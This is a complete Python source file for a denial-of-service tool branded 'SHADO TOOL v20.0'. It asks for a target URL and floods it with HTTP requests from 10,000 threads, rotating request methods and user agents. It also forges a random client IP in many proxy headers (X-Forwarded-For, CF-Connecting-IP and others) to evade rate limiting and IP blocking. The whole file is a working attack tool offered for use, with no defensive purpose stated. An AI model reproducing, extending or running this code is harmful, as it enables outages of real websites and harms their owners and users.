#!/usr/bin/env python3
import threading
import time
import sys
import os
import platform
import random
import urllib.request
import urllib.error
import socket
from urllib.parse import urlparse

YELLOW = '\033[93m'
CYAN = '\033[96m'
RED = '\033[91m'
GREEN = '\033[92m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    banner = f"""
{YELLOW}{BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗     ████████╗ ██████╗  ██████╗ ██╗
║   ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
║   ███████╗███████║███████║██║  ██║██║   ██║       ██║   ██║   ██║██║   ██║██║
║   ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║       ██║   ██║   ██║██║   ██║██║
║   ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
║                                                                           ║
║                    SHADO TOOL v20.0 - FINAL EDITION                        ║
║                    CODED BY PALOFSC - SHADO INDUSTRIES                    ║
╚═══════════════════════════════════════════════════════════════════════════╝
{RESET}
"""
    print(banner)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.6167.164 Mobile',
]

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_ua():
    return random.choice(USER_AGENTS)

def send_request(target_url, stats, display_queue, method):
    try:
        fake_ip = random_ip()
        
        headers = {
            'User-Agent': random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'X-Forwarded-For': fake_ip,
            'X-Real-IP': fake_ip,
            'X-Originating-IP': fake_ip,
            'X-Remote-IP': fake_ip,
            'X-Remote-Addr': fake_ip,
            'X-Client-IP': fake_ip,
            'CF-Connecting-IP': fake_ip,
            'True-Client-IP': fake_ip,
        }
        
        req = urllib.request.Request(target_url, headers=headers, method=method)
        urllib.request.urlopen(req, timeout=0.3)
        stats[0] += 1
        display_queue.append(f"{GREEN}{method} {fake_ip} 200{RESET}")
    except urllib.error.HTTPError as e:
        stats[1] += 1
        display_queue.append(f"{YELLOW}{method} {fake_ip} {e.code}{RESET}")
    except:
        stats[1] += 1
        display_queue.append(f"{RED}{method} {fake_ip} ERR{RESET}")

def worker_thread(target_url, stats, display_queue, running):
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'DELETE', 'PUT', 'PATCH']
    while running[0]:
        method = random.choice(methods)
        send_request(target_url, stats, display_queue, method)

def display_monitor(display_queue, stats, running, start_time):
    while running[0]:
        for _ in range(min(5, len(display_queue))):
            try:
                msg = display_queue.pop(0)
                sys.stdout.write(f"{msg}\n")
                sys.stdout.flush()
            except:
                pass
        
        elapsed = time.time() - start_time
        total = stats[0] + stats[1]
        rps = int(total / elapsed) if elapsed > 0 else 0
        
        bar_len = min(int(rps / 100), 40)
        bar = "#" * bar_len + "-" * (40 - bar_len)
        
        sys.stdout.write(f"\r{bar} RPS:{rps:>6} | HIT:{stats[0]:>8} | FAIL:{stats[1]:>8} | TOTAL:{total:>8} | {elapsed:>5.0f}s")
        sys.stdout.flush()
        
        time.sleep(0.05)

class SHADODDoSTool:
    def __init__(self):
        self.running = [True]

    def attack(self, url):
        stats = [0, 0]
        start_time = time.time()
        display_queue = []
        
        print(f"\n[+] TARGET: {url}")
        print("[!] ATTACK STARTED - PRESS CTRL+C TO STOP\n")
        print("=" * 70)
        
        threads = []
        num_threads = 10000
        
        display_thread = threading.Thread(target=display_monitor, args=(display_queue, stats, self.running, start_time))
        display_thread.daemon = True
        display_thread.start()
        
        for i in range(num_threads):
            t = threading.Thread(target=worker_thread, args=(url, stats, display_queue, self.running))
            t.daemon = True
            t.start()
            threads.append(t)
        
        try:
            while self.running[0]:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running[0] = False
            print(f"\n\n[!] ATTACK STOPPED")
            elapsed = time.time() - start_time
            print("[+] FINAL STATS:")
            print(f"    Total Requests: {stats[0]+stats[1]:,}")
            print(f"    Successful: {stats[0]:,}")
            print(f"    Failed: {stats[1]:,}")
            print(f"    Duration: {elapsed:.0f}s")
            print(f"    Average RPS: {int((stats[0]+stats[1])/elapsed) if elapsed>0 else 0}")

    def start(self):
        os.system('cls' if platform.system() == "Windows" else 'clear')
        print_banner()
        
        url = input("ENTER TARGET URL: ").strip()
        
        if not url.startswith("http"):
            url = "https://" + url
        
        print("[*] INITIALIZING ATTACK ENGINE...")
        time.sleep(0.5)
        self.attack(url)

if __name__ == "__main__":
    tool = SHADODDoSTool()
    tool.start()